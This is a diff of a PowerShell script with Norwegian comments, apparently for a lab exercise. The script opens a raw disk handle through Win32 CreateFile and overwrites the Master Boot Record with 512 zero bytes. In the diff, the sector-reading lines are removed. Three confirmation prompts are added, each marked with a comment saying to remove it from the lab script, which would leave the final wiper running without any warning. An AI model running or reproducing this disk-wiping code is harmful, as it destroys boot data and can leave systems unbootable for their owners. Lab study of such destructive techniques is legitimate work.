@@ -1,4 +1,11 @@
-# 1. Definer Win32 CreateFile via C# P/Invoke
+
+
+#fjern fra lab script
+read-host "Er du sikker på at du vil slette MBR? Dette kan gjøre systemet ustartbart! Trykk Enter for å fortsette eller Ctrl+C for å avbryte."
+read-host "Trykk Enter for å bekrefte."
+read-host "Er du helt sikker? Dette kan ikke angres!"
+#fjern fra lab script
+
 $code = @"
 using System;
 using System.Runtime.InteropServices;
@@ -36,11 +43,7 @@ if ($null -eq $handle -or $handle.IsInvalid) {
 # 4. Koble handle til FileStream og les 1 sektor (512 bytes)
 try {
     $fs = New-Object System.IO.FileStream($handle, [System.IO.FileAccess]::ReadWrite)
-    $buffer = New-Object byte[] 512
-    $bytesRead = $fs.Read($buffer, 0, $buffer.Length)
     
-    ($buffer[0..15] | ForEach-Object { $_.ToString("X2") }) -join " "
-
     # 5. Skriv nuller til MBR (første 512 bytes)
     $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
     $zeroBuffer = New-Object byte[] 512
